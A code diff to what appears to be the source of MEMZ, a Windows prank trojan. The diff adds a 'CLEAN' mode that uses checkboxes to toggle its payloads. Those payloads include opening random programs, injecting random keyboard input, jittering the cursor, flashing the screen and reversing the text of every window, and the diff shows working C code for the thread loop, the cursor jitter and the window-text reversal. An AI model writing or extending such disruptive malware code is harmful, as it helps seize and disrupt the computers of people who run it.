@@ -1,5 +1,18 @@
 #include "memz.h"
 
+#ifdef CLEAN
+PAYLOAD payloads[] = {
+	{ payloadExecute, L"Open random websites/programs", NULL, 0, 0, 0 },
+	{ payloadCursor, L"Random cursor movement", NULL, 0, 0, 0 },
+	{ payloadKeyboard, L"Random keyboard input", NULL, 0, 0, 0 },
+	{ payloadSound, L"Random error sounds", NULL, 0, 0, 0 },
+	{ payloadBlink, L"Flashing screen", NULL, 0, 0, 0 },
+	{ payloadMessageBox, L"Message boxes", NULL, 0, 0, 0 },
+	{ payloadDrawErrors, L"Draw error icons", NULL, 0, 0, 0 },
+	{ payloadChangeText, L"Reverse text on screen", NULL, 0, 0, 0 },
+	{ payloadPIP, L"Render screen into screen", NULL, 0, 0, 0 },
+	{ payloadPuzzle, L"Screen glitches", NULL, 0, 0, 0 }
+#else
 const PAYLOAD payloads[] = {
 	{ payloadExecute, 30000 },
 	{ payloadCursor, 30000 },
@@ -11,23 +24,40 @@ const PAYLOAD payloads[] = {
 	{ payloadChangeText, 40000 },
 	{ payloadPIP, 60000 },
 	{ payloadPuzzle, 15000 }
+#endif
 };
 
 const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
 
 DWORD WINAPI payloadThread(LPVOID parameter) {
+#ifndef CLEAN
 	int delay = 0;
 	int times = 0;
 	int runtime = 0;
+#endif
 
-	int(*function)(int, int) = (int(*)(int, int))parameter;
+	PAYLOAD *payload = (PAYLOAD*)parameter;
 
 	for (;;) {
+#ifdef CLEAN
+		if (SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
+			if (payload->delay-- == 0) {
+				payload->delay = (payload->payloadFunction)(payload->times++, payload->runtime);
+			}
+
+			payload->runtime++;
+		} else {
+			 payload->runtime = 0;
+			 payload->times = 0;
+			 payload->delay = 0;
+		}
+#else
 		if (delay-- == 0) {
-			delay = (*function)(times++, runtime);
+			delay = (payload->payloadFunction)(times++, runtime);
 		}
 
 		runtime++;
+#endif
 		Sleep(10);
 	}
 }
@@ -53,7 +83,7 @@ int payloadCursor(int times, int runtime) {
 	POINT cursor;
 	GetCursorPos(&cursor);
 
-	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (runtime / 2200 + 1)), cursor.y + (random() % 3 - 1) * (random() % (runtime / 2200 + 1)));
+	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)), cursor.y + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)));
 
 	return 2;
 }
@@ -102,17 +132,16 @@ BOOL CALLBACK EnumWindowProc(HWND hwnd, LPARAM lParam) {
 	return TRUE;
 }
 
+// TODO Fix Problems on Windows 10
 void enumerateChildren(HWND hwnd) {
 	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);
 
 	SendMessageW(hwnd, WM_GETTEXT, 8192, (LPARAM)str);
 	strReverseW(str);
 	SendMessageW(hwnd, WM_SETTEXT, NULL, (LPARAM)str);
-
 	GlobalFree(str);
 
 	HWND child = GetWindow(hwnd, GW_CHILD);
-
 	while (child) {
 		enumerateChildren(child);
 		child = GetWindow(child, GW_HWNDNEXT);
